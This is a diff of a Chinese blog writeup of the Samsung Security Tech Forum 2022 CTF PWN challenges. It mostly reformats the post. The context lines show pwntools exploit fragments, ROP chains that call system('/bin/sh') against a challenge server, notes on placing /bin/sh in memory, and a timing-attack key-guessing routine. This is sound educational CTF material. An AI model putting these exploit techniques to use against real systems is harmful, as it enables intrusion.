@@ -1,20 +1,18 @@
 ---
-title: "Samsung Security Tech Forum 2022 Writeup"
-date: "2022-08-23"
+title: 'Samsung Security Tech Forum 2022 Writeup'
+date: '2022-08-23'
 tags: ['PWN', 'Writeup']
 draft: false
-summary: "本次比赛的题目质量非常高，但是比较遗憾的是只有一天时间而且在周中，所以在比赛中没有做出来很多题目。幸运的是，比赛结束后环境还会保存一段时间，所以我索性把所有PWN的题目都研究学习一番，希望可以查缺补漏、有所收获。"
+summary: '本次比赛的题目质量非常高，但是比较遗憾的是只有一天时间而且在周中，所以在比赛中没有做出来很多题目。幸运的是，比赛结束后环境还会保存一段时间，所以我索性把所有PWN的题目都研究学习一番，希望可以查缺补漏、有所收获。'
 ---
 
 本次比赛的题目质量非常高，但是比较遗憾的是只有一天时间而且在周中，所以在比赛中没有做出来很多题目。幸运的是，比赛结束后环境还会保存一段时间，所以我索性把所有PWN的题目都研究学习一番，希望可以查缺补漏、有所收获。
-
-
 
 ## Tutorial
 
 ### bof101
 
-![img](/static/images/Samsung-Security-Tech-Forum-2022-WriteUp/bia_DmAg-FzIO8rX6XstMA.png)                         
+![img](/static/images/Samsung-Security-Tech-Forum-2022-WriteUp/bia_DmAg-FzIO8rX6XstMA.png)
 
 此题目为最基础的栈溢出题目，仅考察构造栈结构时的填充，类似于模拟Canary。因此，我们仅需要在填充栈时将ebp下方4字节填充为0xdeadbeef即可(注意是16进制的数字而不是字符)。
 
@@ -38,13 +36,13 @@ sh.send(payload)
 print(sh.recv())
 ```
 
-![img](/static/images/Samsung-Security-Tech-Forum-2022-WriteUp/uraNPUO5eu_pvNfUbAlqTw.png)        
+![img](/static/images/Samsung-Security-Tech-Forum-2022-WriteUp/uraNPUO5eu_pvNfUbAlqTw.png)
 
 ### bof102
 
 此关为32位小端程序，仅开启NX段保护。
 
-![img](/static/images/Samsung-Security-Tech-Forum-2022-WriteUp/GDOt0x1R07_pw51CB5RtOQ.png)                
+![img](/static/images/Samsung-Security-Tech-Forum-2022-WriteUp/GDOt0x1R07_pw51CB5RtOQ.png)
 
 题目中存在接受用户输入的逻辑，并且用户输入会被保存至全局变量name中。
 
@@ -79,7 +77,7 @@ sh.interactive()
 
 ![img](/static/images/Samsung-Security-Tech-Forum-2022-WriteUp/1tPa_uM8MK4HYayGD6ZIBw.png)
 
-此外值得一提的是，bof的main函数会调用system函数，导致创建子进程从而使得我们的debug会跟丢。这时我们可以在运行程序之前传入`set follow-fork-mode parent`  来忽略子进程而持续跟进该进程本身。
+此外值得一提的是，bof的main函数会调用system函数，导致创建子进程从而使得我们的debug会跟丢。这时我们可以在运行程序之前传入`set follow-fork-mode parent` 来忽略子进程而持续跟进该进程本身。
 
 ### bof103
 
@@ -134,7 +132,7 @@ ret_addr = 0x400529
 
 payload = b'A'*24
 payload += p64(ret_addr)
-payload += p64(pop_rdi_addr) + p64(0x1) + p64(pop_rsi_addr) + b'/bin/sh\x00' + p64(use_me_func_addr) 
+payload += p64(pop_rdi_addr) + p64(0x1) + p64(pop_rsi_addr) + b'/bin/sh\x00' + p64(use_me_func_addr)
 payload += p64(pop_rdi_addr) + p64(key_addr)
 payload += p64(system_addr)
 payload += b'\n'
@@ -177,11 +175,11 @@ sh.interactive()
 退出时，通常会执行leave和ret语句，也就是我们常用的return返回。函数退出时栈理应会恢复原样，但是实际情况下可能会在调用函数中来调整，使得其恢复原样(本题目就是如此)。
 
 ```
-leave:  
+leave:
 		mov $esp, $ebp
 		pop $ebp
 ret:
-		mov $eip, $esp	
+		mov $eip, $esp
 ```
 
 另一个我遇到的困惑的就是在ROP链中调用函数时，是应该填函数的地址(函数第一条指令地址)还是程序中存在的call 此函数的地址。
@@ -213,7 +211,7 @@ sh = remote("3.39.120.206",1337)
 r_addr = 0x08048526 # the first instruction in func r
 x_addr = 0x080485b4 # the first instruction in func x
 buf_in_bss_addr = 0x0804a040 # writable addr
-pppr_addr= 0x080486a9 # pop esi ; pop edi ; pop ebp ; ret 
+pppr_addr= 0x080486a9 # pop esi ; pop edi ; pop ebp ; ret
 
 ### be careful with 32-bit function calling convention
 ### &func + ret_addr + param_1 + param_2 + ...
@@ -241,13 +239,13 @@ sh.interactive()
 ```
 To emulate,
     $ qemu-riscv64 ./target
-    
+
 To debug,
     $ qemu-riscv64 -g 9000 ./target
     $ gdb-multiarch
     (gdb) target remote localhost:9000
     (gdb) c
-    
+
 To disassemble,
     $ /usr/riscv64-linux-gnu/bin/objdump -d ./target
 ```
@@ -294,12 +292,12 @@ RISCV指令集中常见的汇编指令如下所示。
 
 这可能是每一道Pwn题目都会遇到的问题，目前来看有以下几种方式：
 
-+ 可执行文件中中存在/bin/sh字符串
-+ 存在用户输入字符串的逻辑并会保存至内存(e.g. bof102)
-+ 虽然不存在将用户输入直接保存到内存的情况，但是存在可控制输入输出流的接受用户输入的函数(read函数，或者其他自定义接受用户输入的函数)，此情况下可以通过控制函数参数实现内存任意位置写入(e.g. pppr)
-+ 通过Gadgets构造内存字符串写入的ROP链，一般需要利用类似于mov [%eax], %edx的内存写入指令
-+ 动态链接程序中泄漏了glibc的偏移地址，从而可以确定glibc中/bin/sh的位置
-+ To be continued
+- 可执行文件中中存在/bin/sh字符串
+- 存在用户输入字符串的逻辑并会保存至内存(e.g. bof102)
+- 虽然不存在将用户输入直接保存到内存的情况，但是存在可控制输入输出流的接受用户输入的函数(read函数，或者其他自定义接受用户输入的函数)，此情况下可以通过控制函数参数实现内存任意位置写入(e.g. pppr)
+- 通过Gadgets构造内存字符串写入的ROP链，一般需要利用类似于mov [%eax], %edx的内存写入指令
+- 动态链接程序中泄漏了glibc的偏移地址，从而可以确定glibc中/bin/sh的位置
+- To be continued
 
 因此，我们需要根据题目来寻找合适的/bin/sh写入方式。
 
@@ -437,22 +435,22 @@ def attackYou():
             letters = [95]
         else:
             letters = range(97, 123)
-        
+
         for leaf in all_possibile_keys.leaves():
             if all_possibile_keys.level(leaf.identifier) != i:
                 continue
-            
+
             cost_time = {}
             for letter in letters:
                 cur_guessed_key = leaf.data + chr(letter)
                 start = time.time()
                 output = func1(do_crypt(cur_guessed_key))
                 end = time.time()
-                
+
                 # Filter2
                 if output == len(cur_guessed_key)%2:
                     cost_time[cur_guessed_key] = end-start
-            
+
             # Filter1
             cur_guessed_key = sorted(cost_time.items(), key=lambda item:item[1])[0][0]
             new_node_tag = str(i+1) + '-' + cur_guessed_key
@@ -465,4 +463,3 @@ def attackYou():
 由于现在环境已经失效，我只能在本地模拟该解出过程如下所示。
 
 ![drstrange-3](/static/images/Samsung-Security-Tech-Forum-2022-WriteUp/drstrange-3.png)
-
